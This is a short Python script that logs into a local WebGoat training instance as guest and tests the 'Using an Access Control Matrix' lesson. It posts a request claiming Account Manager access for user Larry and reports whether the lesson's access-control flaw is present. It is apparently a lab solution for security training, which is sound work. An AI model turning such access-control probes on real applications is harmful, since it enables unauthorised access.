import requests

#url for logging in 

url = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'

# the session instance for get/post use.

login_payload = {'username':'guest','password':'guest'}
session = requests.Session()
response  = session.post(url,data=login_payload)

#access menu
#if response.status_code==200:
menu = session.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')
#find our lesson
attack_start = menu.text.find('Using an Access Control Matrix')
#find the param section
post_attack = menu.text.find('Screen', attack_start)
#get user's specific session params
params = menu.text[post_attack: post_attack + 21]
#use those params for their specific url
new_url = 'http://127.0.0.1:8080/WebGoat/attack?' + params
#create the vulnerable payload. Larry should not be allowed account manager priviliges
payload = {'User':'Larry','Resource':'Account Manager','SUBMIT':'Check Access'}
#post with the payload
response = session.post(new_url, data=payload)

#print(response.text)
vulnerable="Congratulations" in response.text

if vulnerable:
	print 'vulnerability exists'
else:
	print 'vulnerability does not exists'
